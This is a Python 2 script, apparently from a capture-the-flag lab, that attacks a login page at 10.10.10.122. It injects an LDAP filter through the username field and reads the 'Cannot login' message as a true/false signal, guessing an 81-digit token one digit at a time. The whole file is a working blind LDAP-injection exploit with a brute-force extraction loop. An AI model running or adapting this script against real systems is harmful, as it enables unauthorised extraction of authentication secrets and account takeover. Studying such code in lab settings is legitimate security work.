#!/usr/bin/env python2

import sys
import time
import requests

# from bs4 import BeautifulSoup as soup

# data = { "inputUsername": "admin", "inputOTP": "" }

# response = requests.post("http://10.10.10.122/login.php", data=data)

# print soup(response.text, "html.parser").find_all("div")[2].get_text().strip("\n")[4:]

def sendPayload(user, password):
    data = { "inputUsername": user, "inputOTP": password }
    response = requests.post("http://10.10.10.122/login.php", data=data)
    
    if response.status_code != 200:
        print "Wrong payload specified!"
        sys.exit(1)
        
    return response

def validateAttempt(response):
    if "Cannot login" in response.text:
        return 1
    else:
        return 0
    
if __name__ == "__main__":
    token = ""
    password = "random"
    
    while True:
        for i in range(10):
            user = "%2A%29%28pager%3D%2A%29%29%28%7C%28pager%3D" + token + str(i) + "%2A"
            response = sendPayload(user, password)
            valid = validateAttempt(response)
            if valid == 1:
                token = token + str(i)
                print "Extracting token, length %s: %s" % (str(len(token)),token)
                
        if len(token) == 81:
            break
        
        time.sleep(2)
        
    print "Token extracted, length %s: %s" % (str(len(token)), token)
